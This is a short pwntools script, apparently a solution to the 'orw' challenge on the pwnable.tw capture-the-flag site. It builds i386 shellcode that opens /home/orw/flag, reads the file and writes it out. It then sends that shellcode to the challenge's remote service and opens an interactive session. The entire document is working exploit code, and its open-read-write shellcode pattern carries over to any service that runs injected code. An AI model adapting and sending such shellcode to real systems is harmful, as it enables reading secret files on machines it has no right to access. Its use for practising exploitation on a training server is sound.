from pwn import *
context.update(os='linux', arch='i386')

io = remote("chall.pwnable.tw", 10001)
p = shellcraft.open('/home/orw/flag') 
p += shellcraft.syscall('SYS_read', 'eax', 'esp', 0x100)
p += shellcraft.write(1, 'esp', 0x100)
p = asm(p)
print disasm(p)

io.send(p)
io.interactive()
